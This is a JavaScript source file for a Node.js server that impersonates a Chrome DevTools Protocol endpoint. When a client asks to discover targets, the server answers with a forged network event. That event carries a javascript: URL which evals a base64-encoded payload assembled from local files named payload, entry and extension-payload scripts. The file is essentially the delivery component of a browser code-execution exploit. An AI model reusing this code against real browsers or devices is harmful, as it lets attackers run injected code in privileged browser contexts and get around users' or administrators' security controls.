import { WebSocketServer } from "ws";
import { createServer } from "http";
import finalhandler from "finalhandler";
import serveStatic from "serve-static";
import * as fs from "fs";
const WebSocket_port = 8080;
const HTTP_port = 9123;
const wss = new WebSocketServer({ port: WebSocket_port });
const serve = serveStatic("./");

createServer((req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    serve(req, res, finalhandler(req, res));
}).listen(HTTP_port);

console.log(
    `The server is accessible at http://localhost:${HTTP_port}\n--------`,
);
console.log(
    `The websocket is accessible at http://localhost:${WebSocket_port}\n--------`,
);

let sessionId = "89AC63D12B18F3EE9808C13899C9B695";



function Payload() {
    let entry = fs.readFileSync("./entry.js", "utf8")
        .replace("%%ENTRYCSS%%", fs.readFileSync("./entry.css", "base64"))
        .replaceAll("%%CHROMEPAYLOAD%%", fs.readFileSync("./extPayload.js", "base64"))
        .replaceAll("%%DREAMLANDJS%%", fs.readFileSync("./dreamland.js", "base64"))
        .replaceAll("%%CHROMEPAYLOADCSS%%", fs.readFileSync("./extPayload.css", "base64"));

    let payload = `(async () => { ${
        fs.readFileSync("./payload.mjs", "utf8")
        .replace("%%SCRIPT%%", Buffer.from(entry).toString("base64"))
        .replaceAll("%%DREAMLANDJS%%", fs.readFileSync("./dreamland.js", "base64"))
    } })()`;
    return payload;
}

wss.on("connection", function connection(wss_con) {
    wss_con.on("message", async (msg) => {

        let { id, method, params } = JSON.parse(msg.toString());;
        console.log(id + "> ", method, params);
        let payload = Buffer.from(Payload());
        if (method === "Target.setDiscoverTargets") {
            handleDiscoverTargets(wss_con, payload);
        }

        wss_con.send(
            JSON.stringify({
                id: id,
                error: null,
                sessionId: sessionId,
                result: {},
            }),
        );
    });
});


function handleDiscoverTargets(wss_con, payload) {
    wss_con.send(
        JSON.stringify({
            method: "Network.requestWillBeSent",
            params: {
                request: {
                    url: `javascript: (function () {eval(atob("${payload.toString("base64")}"))})()`,
                },
            },
        })
    );
}